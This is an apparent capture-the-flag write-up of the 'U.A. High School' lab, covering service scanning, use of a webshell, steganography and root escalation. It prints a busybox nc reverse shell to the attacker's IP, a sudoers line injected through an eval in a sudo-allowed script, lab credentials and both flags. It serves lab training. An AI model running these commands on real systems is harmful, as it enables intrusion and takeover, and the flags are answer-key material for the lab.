# U.A. High School

---

## Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Directory Enumeration

`/assets`

`assets/index.php`

http://10.10.222.82/assets/index.php

(might be hidden functionality, webshell)

`http://10.10.222.82/assets/index.php?cmd=id`

`http://10.10.222.82/assets/index.php?cmd=which%20nc`

`http://10.10.222.82/assets/index.php?cmd=which%20busybox`

## Initial foothold

`busybox nc 10.4.96.175 4444 -e sh`

`nc -lnvp 4444`


```
www-data@myheroacademia:/var/www$ ls
Hidden_Content  html
www-data@myheroacademia:/var/www$ cat Hidden_Content/
cat: Hidden_Content/: Is a directory
www-data@myheroacademia:/var/www$ cat Hidden_Content/passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg==
www-data@myheroacademia:/var/www$ cat Hidden_Content/passphrase.txt | base64 -d
AllmightForEver!!!
www-data@myheroacademia:/var/www$
```

`wget http://10.10.19.204/assets/images/oneforall.jpg`

`python3 magicbytes.py -i oneforall.jpg -m jpg`

`steghide extract -sf oneforall.jpg`

got creds.txt

```
cat creds.txt
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

`su deku` with password `One?For?All_!!one1/A`

**User.txt**
`THM{W3lC0m3_D3kU_1A_0n3f0rAll??}`

## Privilege Escaltion

```
deku@myheroacademia:~$ sudo -l
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
deku@myheroacademia:~$

```

```
deku@myheroacademia:~$ cat /opt/NewComponent/feedback.sh
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input."
fi

deku@myheroacademia:~$
```

`read feedback`

`eval "echo $feedback"`

we can execute commands

`deku ALL=NOPASSWD: ALL >> /etc/sudoers`

Since I can write any file as root by exploiting feedback , the quickest possible way is to add our current user deku on sudoers file which mean deku can be a member of sudo user and can has all right same as root user.

```
deku@myheroacademia:~$ sudo -l
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
    (root) NOPASSWD: ALL
deku@myheroacademia:~$

```

```
deku@myheroacademia:~$ sudo su
root@myheroacademia:/home/deku#
```

Got Root!

**Root.txt**
`THM{Y0U_4r3_7h3_NUm83r_1_H3r0}`